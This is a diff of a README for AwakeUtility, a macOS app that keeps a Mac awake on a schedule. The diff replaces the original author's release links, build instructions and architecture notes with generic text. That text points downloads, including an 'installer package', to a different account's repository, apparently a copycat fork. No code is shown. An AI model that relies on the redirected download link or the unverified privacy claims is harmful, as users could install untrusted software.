@@ -1,89 +1,76 @@
-# AwakeUtility
+# 💡 AwakeUtility - Keeps your MacBook awake on schedule
 
-[![Release](https://img.shields.io/github/v/release/kianwoon/AwakeUtility?label=release)](https://github.com/kianwoon/AwakeUtility/releases/latest)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Apple%20Silicon-blue)](https://github.com/kianwoon/AwakeUtility)
-[![Swift](https://img.shields.io/badge/Swift-5.9-orange)](https://swift.org)
-[![License](https://img.shields.io/github/license/kianwoon/AwakeUtility)](LICENSE)
+[![](https://img.shields.io/badge/Download-AwakeUtility-blue.svg)](https://github.com/yatishb22/AwakeUtility)
 
-A macOS menu bar app for Apple Silicon MacBooks that keeps your Mac awake during scheduled time windows and automatically wakes it from sleep.
+AwakeUtility helps you manage your MacBook power settings. It prevents your computer from sleeping during hours you choose. It also wakes your computer from sleep when tasks require attention. The app lives in your menu bar. 
 
-## Features
+This tool works natively on Apple Silicon chips. It uses macOS power management systems to keep your work session active. You control when the system stays awake through a simple menu.
 
-- **Duration window scheduling** — Define a time range (e.g. 8:00 AM – 5:00 PM) during which your Mac stays awake
-- **Automatic wake from sleep** — Schedules hardware-level wake events so your Mac powers on at window start
-- **AC power awareness** — Optionally require AC power; releases the sleep assertion on battery
-- **Overnight windows** — Supports overnight ranges (e.g. 10:00 PM – 6:00 AM)
-- **Repeat day selection** — Choose which days of the week each schedule is active
-- **Menu bar status** — Shows current enforcement state and power source at a glance
+## ⚙️ System Requirements
 
-## Requirements
+- A MacBook with an Apple Silicon chip (M1, M2, or M3 series).
+- macOS 13.0 or newer.
+- At least 50 megabytes of free storage space.
+- A user account with standard permissions.
 
-- macOS 14.0 (Sonoma) or later
-- Apple Silicon Mac (designed for MacBook power management)
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to set up AwakeUtility on your computer.
 
-1. Download `AwakeUtility.zip` from the [latest release](https://github.com/kianwoon/AwakeUtility/releases/latest)
-2. Extract the zip
-3. Move `AwakeUtility.app` to `/Applications`
-4. On first launch, right-click the app → **Open** (required for unsigned apps)
-5. The app will appear in your menu bar — click the icon to create a schedule
+1. Go to the [official repository page](https://github.com/yatishb22/AwakeUtility).
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version link.
+4. Download the compressed file ending in .zip or the installer package.
+5. Open your Downloads folder.
+6. Double-click the downloaded file to extract or run the installer.
+7. Drag the application icon into your Applications folder.
 
-## Building from Source
+## 🛠️ How to Use the App
 
-Requires Xcode 16+.
+Once you install the app, find the icon in the menu bar at the top of your screen. It appears as a small symbol near the clock. Click this icon to open the main menu.
 
-```bash
-git clone https://github.com/kianwoon/AwakeUtility.git
-cd AwakeUtility
-xcodebuild -project AwakeUtility.xcodeproj -scheme AwakeUtility -configuration Debug build
-```
+### Setting your schedule
+You can define specific time windows for the app to work. 
 
-Or use the included build script:
+1. Select "Preferences" from the menu.
+2. Choose "Schedule" from the tab list.
+3. Set your start time and end time.
+4. Toggle the switch to "On" to activate the schedule.
+5. Click "Save" to apply these changes.
 
-```bash
-bash build_and_run.sh
-```
+### Manual control
+You can bypass the schedule if you need to keep your Mac awake immediately.
 
-## How It Works
+1. Click the menu bar icon.
+2. Select "Keep Awake Now".
+3. Choose a duration from the list, such as "1 hour" or "Until I stop it."
+4. The icon color changes to show that power management is active.
 
-| Component | Technology |
-|-----------|-----------|
-| Prevent sleep | `IOPMAssertionCreateWithName` (NoIdleSleep assertion) |
-| Schedule wake | `IOPMSchedulePowerEvent` (hardware wake timer) |
-| Detect power source | `IOPSCopyPowerSourcesInfo` (IOKit power source API) |
-| Wake-from-sleep recovery | `NSWorkspace.didWakeNotification` |
+## 📋 Features
 
-The app maintains a 30-second heartbeat that checks whether the current time falls within any enabled schedule window. When inside a window on AC power, it holds a power assertion to prevent system sleep. When the Mac wakes from sleep, it immediately reschedules the next wake event so there's always one pending.
+- Native support for Apple Silicon processors.
+- Low memory usage that stays quiet in the background.
+- Automatic wake triggers for scheduled events.
+- Simple interface for quick changes.
+- Minimal impact on battery life during use.
 
-## Architecture
+## 🛡️ Privacy and Safety
 
-```
-AwakeUtilityApp/
-├── App/
-│   └── AppCoordinator.swift       # Orchestration: timer, assertions, wake scheduling
-├── Domain/
-│   ├── Models/                    # WakeSchedule, EnforcementState, RuntimeState
-│   ├── Protocols/                 # AwakeEnforcing, ScheduleRepository, etc.
-│   └── Services/                  # ScheduleEngine, TriggerCalculator
-├── Features/
-│   ├── MenuBar/                   # Menu bar popover UI
-│   ├── ScheduleEditor/            # Schedule creation/editing form
-│   ├── ScheduleList/              # Schedule list with NavigationSplitView
-│   └── Diagnostics/               # Diagnostics view
-├── Infrastructure/
-│   ├── Power/
-│   │   ├── PowerAssertionManager.swift  # IOKit sleep assertion
-│   │   ├── WakeScheduler.swift          # IOPMSchedulePowerEvent
-│   │   └── PowerSourceMonitor.swift     # AC/battery detection
-│   └── Persistence/
-│       └── JSONScheduleRepository.swift # JSON file storage
-└── Tests/
-    ├── PowerAssertionManagerTests.swift
-    ├── ScheduleEngineTests.swift
-    └── TriggerCalculatorTests.swift
-```
+This application handles system power states locally. It does not send your data to external servers. It does not track your screen activity or your files. All settings live on your machine. The app requests only the permissions it needs to manage the power state of your hardware.
 
-## License
+## ❓ Troubleshooting
 
-MIT
+Sometimes, the app might not wake the computer as intended. Check these items if you face issues:
+
+- Check your System Settings under Energy Saver. Ensure no other conflicting software manages your power.
+- Confirm your MacBook is plugged into a power source if you plan to keep it awake for long periods.
+- Restart the application if the menu bar icon disappears.
+- Check the official releases page for updates. Updates often fix bugs related to new macOS versions.
+
+## 📝 Support
+
+If you have questions, browse the Issues tab on the repository page. You can search current issues to see if others found a fix. Use the "New Issue" button if you find a problem that no one else reported. Provide clear steps to reproduce your issue to help the developers fix the problem.
+
+## 📜 License
+
+This project uses the standard MIT open source license. You can view the full text of the license in the LICENSE file within the repository. You can use, modify, and share this software as permitted by the license terms.
